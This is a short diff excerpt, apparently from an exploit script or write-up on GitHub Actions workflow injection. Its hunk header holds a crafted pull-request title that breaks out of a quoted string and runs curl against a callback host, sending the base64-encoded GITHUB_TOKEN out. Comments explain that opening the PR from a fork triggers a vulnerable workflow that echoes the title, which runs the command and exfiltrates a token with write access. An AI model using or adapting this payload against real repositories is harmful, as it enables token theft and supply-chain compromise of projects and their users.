@@ -313,7 +313,7 @@ PR_TITLE='"; curl -sk http://${cbHost}:${cbPort}/$(cat $GITHUB_TOKEN|base64 -w0)
 
 # Step 3 — Open PR from fork to main repo
 # When the vulnerable workflow runs:
-#   run: echo "${{ github.event.pull_request.title }}"
+#   run: echo "\${{ github.event.pull_request.title }}"
 # It executes our injected command and exfils GITHUB_TOKEN
 
 # GITHUB_TOKEN has write access to:
